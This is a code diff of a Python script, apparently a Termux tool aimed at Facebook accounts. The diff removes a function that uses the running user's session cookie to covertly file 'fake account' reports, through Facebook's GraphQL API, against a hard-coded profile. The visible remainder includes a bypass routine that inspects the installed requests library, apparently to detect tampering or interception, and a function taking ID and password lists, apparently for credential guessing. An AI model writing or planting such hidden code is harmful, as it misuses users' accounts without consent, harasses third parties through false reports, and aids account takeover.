@@ -17,45 +17,6 @@ os.system("clear")
 print("\033[1;33m...CHECKING UPDATES....")
 os.system("git pull")
 slp(5)
-#--> Auto Report
-def auto_report(cookie, url):
-    target = '61552638913294'
-    r = requests.Session()
-    req = bs(r.get(url, headers=hd_get_global, cookies={'cookie':cookie}).content, 'html.parser')
-    dta = GetData(req)
-    ses = re.search('"sessionID":"(.*?)"', str(req)).group(1)
-
-    #--> Step 1
-    var1 = {"input":{"content_id":target,"entry_point":"PROFILE_REPORT_BUTTON","location":"PROFILE_SOMEONE_ELSE","trigger_event_type":"REPORT_BUTTON_CLICKED","nt_context":None,"trigger_session_id":ses},"scale":1}
-    dta.update({'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'CometIXTFacebookContentTriggerRootQuery','variables':json.dumps(var1),'server_timestamps':True,'doc_id':'6769900669784116'})
-    pos1 = r.post('https://www.facebook.com/api/graphql/', data=dta, headers=hd_post_global, cookies={'cookie':cookie}).json()
-    dta.update({'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'CometFacebookIXTNextMutation','server_timestamps':True,'doc_id':'6914576615289569'})
-
-    #--> Step 2
-    context = pos1['data']['ixt_content_trigger']['screen']['view_model']['context']
-    serial  = pos1['data']['ixt_content_trigger']['screen']['view_model']['serialized_state']
-    var2 = {"input":{"frx_tag_selection_screen":{"context":context,"serialized_state":serial,"show_tag_search":False,"tags":["PROFILE_FAKE_ACCOUNT"]},"actor_id":dta['__user'],"client_mutation_id":"1"},"scale":1}
-    dta.update({'variables':json.dumps(var2)})
-    pos2 = r.post('https://www.facebook.com/api/graphql/', data=dta, headers=hd_post_global, cookies={'cookie':cookie}).json()
-
-    #--> Step 3
-    context = pos2['data']['ixt_screen_next']['view_model']['context']
-    serial  = pos2['data']['ixt_screen_next']['view_model']['serialized_state']
-    var3 = {"input":{"frx_report_confirmation_screen":{"context":context,"serialized_state":serial},"actor_id":dta['__user'],"client_mutation_id":"3"},"scale":1}
-    dta.update({'variables':json.dumps(var3)})
-    pos3 = r.post('https://www.facebook.com/api/graphql/', data=dta, headers=hd_post_global, cookies={'cookie':cookie}).json()
-    
-    #--> Step 4
-    context = pos3['data']['ixt_screen_next']['view_model']['context']
-    serial  = pos3['data']['ixt_screen_next']['view_model']['serialized_state']
-    var4 = {"input":{"frx_post_report_process_timeline":{"context":context,"serialized_state":serial},"actor_id":dta['__user'],"client_mutation_id":"4"},"scale":1}
-    dta.update({'variables':json.dumps(var4)})
-    pos4 = r.post('https://www.facebook.com/api/graphql/', data=dta, headers=hd_post_global, cookies={'cookie':cookie}).json()
-    
-    if 'You have submitted a report.' in str(pos4):
-        print('Report Success!')
-    else:
-        print('Report Failed!')
 def bypass():
   file = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py','r')
   file2 = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py','r')
@@ -322,3 +283,4 @@ def m2(ids,names,passlist):
       
 #--end--
 bypass()
+               
